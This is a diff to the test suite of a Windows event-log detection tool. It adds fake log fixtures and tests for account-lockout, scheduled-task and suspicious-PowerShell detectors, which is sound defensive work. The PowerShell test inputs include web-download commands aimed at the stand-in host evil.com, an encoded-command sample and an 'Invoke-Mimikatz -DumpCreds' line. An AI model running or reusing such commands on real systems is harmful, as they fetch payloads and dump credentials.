@@ -31,6 +31,9 @@ from pulse.detections import (
     detect_av_disabled,
     detect_service_installed,
     detect_rdp_logon,
+    detect_account_lockout,
+    detect_scheduled_task_created,
+    detect_suspicious_powershell,
     detect_account_takeover_chain,
     detect_malware_persistence_chain,
     run_all_detections,
@@ -195,6 +198,74 @@ def make_firewall_disabled_event(profile, timestamp="2024-01-15T12:30:00.000Z"):
         "</Event>"
     )
     return {"event_id": 4950, "timestamp": timestamp, "data": xml}
+
+
+def make_account_lockout_event(username, timestamp="2024-01-15T12:45:00.000Z"):
+    """
+    Builds a fake Event 4740 (account lockout) dictionary.
+
+    Parameters:
+        username (str):   The account that was locked out.
+        timestamp (str):  When it happened.
+    """
+    xml = (
+        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
+        "  <System>"
+        "    <EventID>4740</EventID>"
+        f'    <TimeCreated SystemTime="{timestamp}" />'
+        "  </System>"
+        "  <EventData>"
+        f'    <Data Name="TargetUserName">{username}</Data>'
+        "  </EventData>"
+        "</Event>"
+    )
+    return {"event_id": 4740, "timestamp": timestamp, "data": xml}
+
+
+def make_scheduled_task_event(task_name, created_by, timestamp="2024-01-15T12:50:00.000Z"):
+    """
+    Builds a fake Event 4698 (scheduled task created) dictionary.
+
+    Parameters:
+        task_name (str):   Name of the scheduled task.
+        created_by (str):  The user who created it.
+        timestamp (str):   When it happened.
+    """
+    xml = (
+        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
+        "  <System>"
+        "    <EventID>4698</EventID>"
+        f'    <TimeCreated SystemTime="{timestamp}" />'
+        "  </System>"
+        "  <EventData>"
+        f'    <Data Name="TaskName">{task_name}</Data>'
+        f'    <Data Name="SubjectUserName">{created_by}</Data>'
+        "  </EventData>"
+        "</Event>"
+    )
+    return {"event_id": 4698, "timestamp": timestamp, "data": xml}
+
+
+def make_powershell_event(script_text, timestamp="2024-01-15T12:55:00.000Z"):
+    """
+    Builds a fake Event 4104 (PowerShell script block logging) dictionary.
+
+    Parameters:
+        script_text (str): The PowerShell script content.
+        timestamp (str):   When it happened.
+    """
+    xml = (
+        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
+        "  <System>"
+        "    <EventID>4104</EventID>"
+        f'    <TimeCreated SystemTime="{timestamp}" />'
+        "  </System>"
+        "  <EventData>"
+        f'    <Data Name="ScriptBlockText">{script_text}</Data>'
+        "  </EventData>"
+        "</Event>"
+    )
+    return {"event_id": 4104, "timestamp": timestamp, "data": xml}
 
 
 def make_av_disabled_event(timestamp="2024-01-15T13:00:00.000Z"):
@@ -666,6 +737,136 @@ def test_firewall_rule_change_ignores_other_events():
 
 
 # ===========================================================================
+# ACCOUNT LOCKOUT TESTS
+# ===========================================================================
+
+def test_account_lockout_flags_event():
+    """Event 4740 should flag an account lockout."""
+    events = [make_account_lockout_event("jsmith")]
+
+    findings = detect_account_lockout(events)
+
+    assert len(findings) == 1
+    assert findings[0]["rule"] == "Account Lockout"
+    assert findings[0]["severity"] == "HIGH"
+    assert "jsmith" in findings[0]["details"]
+
+
+def test_account_lockout_flags_multiple():
+    """Multiple lockouts should each produce a separate finding."""
+    events = [
+        make_account_lockout_event("jsmith"),
+        make_account_lockout_event("admin"),
+        make_account_lockout_event("svcaccount"),
+    ]
+
+    findings = detect_account_lockout(events)
+
+    assert len(findings) == 3
+
+
+def test_account_lockout_ignores_other_events():
+    """Non-4740 events should be ignored."""
+    events = [make_failed_login_event("admin")]
+
+    findings = detect_account_lockout(events)
+
+    assert len(findings) == 0
+
+
+# ===========================================================================
+# SCHEDULED TASK TESTS
+# ===========================================================================
+
+def test_scheduled_task_flags_event():
+    """Event 4698 should flag a new scheduled task."""
+    events = [make_scheduled_task_event("\\MalwareTask", "admin")]
+
+    findings = detect_scheduled_task_created(events)
+
+    assert len(findings) == 1
+    assert findings[0]["rule"] == "Scheduled Task Created"
+    assert findings[0]["severity"] == "MEDIUM"
+    assert "MalwareTask" in findings[0]["details"]
+    assert "admin" in findings[0]["details"]
+
+
+def test_scheduled_task_flags_multiple():
+    """Multiple task creations should each produce a finding."""
+    events = [
+        make_scheduled_task_event("\\Task1", "admin"),
+        make_scheduled_task_event("\\Task2", "SYSTEM"),
+    ]
+
+    findings = detect_scheduled_task_created(events)
+
+    assert len(findings) == 2
+
+
+def test_scheduled_task_ignores_other_events():
+    """Non-4698 events should be ignored."""
+    events = [make_failed_login_event("admin")]
+
+    findings = detect_scheduled_task_created(events)
+
+    assert len(findings) == 0
+
+
+# ===========================================================================
+# SUSPICIOUS POWERSHELL TESTS
+# ===========================================================================
+
+def test_powershell_flags_encoded_command():
+    """PowerShell with -EncodedCommand should be flagged."""
+    events = [make_powershell_event("powershell -EncodedCommand ZQBjAGgAbwA=")]
+
+    findings = detect_suspicious_powershell(events)
+
+    assert len(findings) == 1
+    assert findings[0]["rule"] == "Suspicious PowerShell"
+    assert findings[0]["severity"] == "HIGH"
+    assert "encoded command" in findings[0]["details"]
+
+
+def test_powershell_flags_download_cradle():
+    """PowerShell downloading from the internet should be flagged."""
+    events = [make_powershell_event("Invoke-WebRequest -Uri http://evil.com/payload.exe")]
+
+    findings = detect_suspicious_powershell(events)
+
+    assert len(findings) == 1
+    assert "web download" in findings[0]["details"]
+
+
+def test_powershell_flags_mimikatz():
+    """PowerShell referencing Mimikatz should be flagged."""
+    events = [make_powershell_event("Invoke-Mimikatz -DumpCreds")]
+
+    findings = detect_suspicious_powershell(events)
+
+    assert len(findings) == 1
+    assert "credential theft" in findings[0]["details"]
+
+
+def test_powershell_ignores_benign_scripts():
+    """Normal PowerShell scripts without suspicious patterns should not be flagged."""
+    events = [make_powershell_event("Get-Process | Where-Object { $_.CPU -gt 100 }")]
+
+    findings = detect_suspicious_powershell(events)
+
+    assert len(findings) == 0
+
+
+def test_powershell_ignores_other_events():
+    """Non-4104 events should be ignored."""
+    events = [make_failed_login_event("admin")]
+
+    findings = detect_suspicious_powershell(events)
+
+    assert len(findings) == 0
+
+
+# ===========================================================================
 # ATTACK CHAIN TESTS
 # ===========================================================================
 
@@ -811,13 +1012,18 @@ def test_run_all_detections_combines_results():
         + [make_firewall_disabled_event("Public")]
         # firewall rule added — triggers firewall rule change
         + [make_firewall_rule_event(4946, "Allow Port 4444")]
+        # account lockout — triggers account lockout
+        + [make_account_lockout_event("admin")]
+        # scheduled task — triggers scheduled task detection
+        + [make_scheduled_task_event("\\Updater", "admin")]
+        # suspicious PowerShell — triggers PowerShell detection
+        + [make_powershell_event("Invoke-WebRequest -Uri http://evil.com/shell.ps1")]
     )
 
     findings = run_all_detections(events)
 
-    # We expect 11 findings: 9 individual rules + 2 chain detections.
-    # (The chain detections fire because the events we built tell the right story.)
-    assert len(findings) == 11
+    # We expect 14 findings: 12 individual rules + 2 chain detections.
+    assert len(findings) == 14
 
     rule_names = set(f["rule"] for f in findings)
     assert rule_names == {
@@ -830,6 +1036,9 @@ def test_run_all_detections_combines_results():
         "Antivirus Disabled",
         "Firewall Disabled",
         "Firewall Rule Changed",
+        "Account Lockout",
+        "Scheduled Task Created",
+        "Suspicious PowerShell",
         "Account Takeover Chain",
         "Malware Persistence Chain",
     }
